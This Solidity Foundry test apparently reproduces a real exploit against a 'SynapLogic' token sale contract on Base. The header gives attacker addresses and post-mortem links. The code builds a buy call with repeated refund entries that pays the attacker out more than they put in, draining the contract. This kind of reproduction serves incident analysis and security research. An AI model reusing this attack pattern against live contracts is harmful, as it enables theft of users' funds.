// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~27.6 ETH
// Attacker : 0x3Aa8bb3A19EECD229Cb33fbc03Ff549473e30F38
// Attack Contract : 0x3821f686384c231e2F71ea093Fb6189dE803f482
// Vulnerable Contract : 0xC859aC8429fB4A5E24F24a7BEd3fE3a8Db4fb371 (implementation)
// Attack Tx : https://skylens.certik.com/tx/base/0xc54c00046364b6e889db18c73beee9b81df6b5ca822b6d262b3d30cdf376c4b1

// @Analysis
// Post-mortem : https://x.com/hklst4r/status/2013440353844461979?s=20, https://x.com/nn0b0dyyy/status/2013445844394279260?s=20
// Alerts : https://x.com/CertiKAlert/status/2013440963851755610?s=20, https://x.com/TenArmorAlert/status/2013432861366292520?s=20

contract SynapLogicExploitTest is Test {
    address constant SALE_PROXY = 0x39F36e2E58f36F7E5c17784847fd07Da1fEE1a32;
    bytes4 constant BUY_SELECTOR = 0x670a3267;
    uint256 constant FORK_BLOCK = 41038633;
    address attacker;

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        vm.label(SALE_PROXY, "SaleProxy");
        attacker = makeAddr("attacker");
        vm.label(attacker, "Attacker");
    }

    function testSynapLogicExploit() public {
        uint256 minBnb = ISale(SALE_PROXY).minBnb();
        uint256 value = minBnb > 0 ? minBnb : 1 ether;
        uint256 refundPerIter = value / 10;
        require(refundPerIter > 0, "refundPerIter=0");

        uint256 saleBal = SALE_PROXY.balance;
        uint256 maxRefund = saleBal + value;
        uint256 maxIters = maxRefund / refundPerIter;
        uint256 iters = maxIters > 20 ? 20 : maxIters;
        uint256 expectedRefund = refundPerIter * iters;

        address[] memory recipients = new address[](iters);
        uint256[] memory rates = new uint256[](iters);
        bool[] memory refundFlags = new bool[](iters);
        for (uint256 i = 0; i < iters; i++) {
            recipients[i] = attacker;
            rates[i] = 10;
            refundFlags[i] = true;
        }

        vm.deal(attacker, value);
        uint256 beforeBal = attacker.balance;
        emit log_named_uint("minBnb", minBnb);
        emit log_named_uint("msg.value", value);
        emit log_named_uint("saleBal", saleBal);
        emit log_named_uint("iters", iters);
        emit log_named_uint("refundPerIter", refundPerIter);
        emit log_named_uint("expectedRefund", expectedRefund);
        emit log_named_uint("attackerBefore", beforeBal);
        require(iters > 1, "insufficient liquidity for PoC");
        require(expectedRefund > value, "no profit with current liquidity");

        vm.prank(attacker);
        (bool ok, ) = SALE_PROXY.call{value: value}(
            abi.encodeWithSelector(BUY_SELECTOR, recipients, rates, refundFlags)
        );
        require(ok, "buy failed");

        uint256 afterBal = attacker.balance;
        emit log_named_uint("attackerAfter", afterBal);
        emit log_named_int("profitDelta", int256(afterBal) - int256(beforeBal));
        assertGt(afterBal, beforeBal - value);
    }

}

interface ISale {
    function minBnb() external view returns (uint256);
}
